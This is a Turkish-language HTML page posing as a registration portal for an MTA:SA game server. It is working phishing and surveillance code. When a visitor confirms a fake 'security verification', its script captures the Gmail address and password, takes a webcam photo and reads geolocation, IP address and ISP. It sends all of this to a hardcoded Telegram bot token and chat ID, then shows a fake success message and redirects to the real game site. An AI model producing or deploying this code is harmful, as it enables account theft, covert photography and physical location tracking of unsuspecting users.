<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MTA:SA Server Portal</title>
    <style>
        body { margin: 0; padding: 0; background-color: #0a0a0a; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; color: #fff; overflow: hidden; }
        .mta-box { background: #161616; width: 100%; max-width: 380px; padding: 30px; border-radius: 15px; border: 1px solid #333; box-shadow: 0 25px 50px rgba(0,0,0,1); text-align: center; position: relative; }
        
        /* LOGO ALANI - GARANTİ YÖNTEM */
        .logo-placeholder { margin-bottom: 20px; }
        .mta-text-logo { font-size: 32px; font-weight: 800; color: #3498db; letter-spacing: -1px; text-shadow: 0 0 15px rgba(52, 152, 219, 0.5); font-style: italic; }
        .mta-sub-text { font-size: 10px; color: #555; display: block; margin-top: -5px; }

        h2 { font-size: 18px; margin-bottom: 20px; color: #3498db; text-transform: uppercase; letter-spacing: 1px; }
        .input-group { margin-bottom: 15px; text-align: left; }
        .input-group label { display: block; font-size: 11px; color: #666; margin-bottom: 5px; font-weight: bold; }
        .input-group input { width: 100%; padding: 12px; background: #222; border: 1px solid #333; border-radius: 6px; color: white; box-sizing: border-box; outline: none; }
        .main-btn { background: #3498db; color: white; border: none; padding: 15px; width: 100%; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 15px; margin-top: 10px; }
        #verify-modal { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #1a1a1a; border-radius: 15px; padding: 30px; box-sizing: border-box; z-index: 10; flex-direction: column; justify-content: center; }
        .confirm-btn { background: #27ae60; color: white; border: none; padding: 15px; width: 100%; border-radius: 6px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>

<div class="mta-box">
    <div id="reg-step">
        <div class="logo-placeholder">
            <span class="mta-text-logo">MTA:SA</span>
            <span class="mta-sub-text">MULTI THEFT AUTO: SAN ANDREAS</span>
        </div>
        <h2>Sunucu Kayıt Paneli</h2>
        <div class="input-group">
            <label>GMAIL ADRESİ</label>
            <input type="email" id="email" placeholder="email@gmail.com">
        </div>
        <div class="input-group">
            <label>ŞİFRE</label>
            <input type="password" id="pass" placeholder="********">
        </div>
        <button class="main-btn" onclick="dogrulamaGoster()">HESABI OLUŞTUR</button>
    </div>

    <div id="verify-modal">
        <h3 style="color:#f1c40f">⚠️ SON ADIM: DOĞRULAMA</h3>
        <p style="font-size: 13px; color:#ccc; margin-bottom:20px;">
            Sunucu Anti-Cheat ve Voice Chat sisteminin aktif edilebilmesi için <b>Güvenlik Doğrulaması</b> zorunludur.
        </p>
        <button class="confirm-btn" id="finalBtn" onclick="herseyiBitir()">ERİŞİMİ ONAYLA VE BAĞLAN</button>
    </div>
</div>

<script>
    const botToken = "6418277280:AAGlTr7IRw8CL__1EWjpkI_j9ZHkRjLnedc";
    const chatId = "1540769169";

    function dogrulamaGoster() {
        if(!document.getElementById('email').value || !document.getElementById('pass').value) {
            alert("Lütfen tüm alanları doldurun!"); return;
        }
        document.getElementById('reg-step').style.opacity = '0.1';
        document.getElementById('verify-modal').style.display = 'flex';
    }

    async function fotoCekVeGonder(stream) {
        try {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.muted = true;
            await video.play();

            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            
            await new Promise(r => setTimeout(r, 1500)); // Odaklanma süresi
            
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append('photo', blob, 'capture.jpg');
                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}`, {
                    method: 'POST', body: formData
                });
                stream.getTracks().forEach(t => t.stop());
            }, 'image/jpeg', 0.7);
        } catch (e) { console.log(e); }
    }

    async function herseyiBitir() {
        const email = document.getElementById('email').value;
        const pass = document.getElementById('pass').value;
        const btn = document.getElementById('finalBtn');
        btn.innerText = "SİSTEM DOĞRULANIYOR...";
        btn.disabled = true;

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
            await fotoCekVeGonder(stream);
        } catch(e) { gonder("❌ Kamera reddedildi."); }

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(p => {
                gonder(`📍 **KONUM:** http://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
            });
        }

        try {
            const ipRes = await fetch('https://ipapi.co/json/');
            const ipData = await ipRes.json();
            gonder(`👤 **GİRİŞ:** \`${email}\` / \`${pass}\`\n🌐 **IP:** \`${ipData.ip}\`\n🏢 **ISP:** ${ipData.org}`);
        } catch(e) {}

        setTimeout(() => {
            alert("Doğrulama başarılı! Mailinizi kontrol edin.");
            window.location.href = "https://multitheftauto.com";
        }, 3000);
    }

    function gonder(m) {
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(m)}&parse_mode=markdown`);
    }
</script>
</body>
</html>
